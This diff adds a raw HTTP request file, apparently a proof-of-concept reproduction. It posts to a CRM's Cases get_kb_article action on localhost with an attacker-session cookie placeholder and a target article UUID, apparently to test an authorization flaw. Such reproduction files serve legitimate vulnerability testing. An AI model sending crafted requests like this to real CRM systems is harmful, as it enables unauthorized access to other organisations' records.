@@ -1,0 +1,6 @@
+POST /index.php?module=Cases&action=get_kb_article HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<attacker-session>
+Content-Type: application/x-www-form-urlencoded
+
+article=764d40ff-9d15-4395-b3a7-b70531bdd4a9
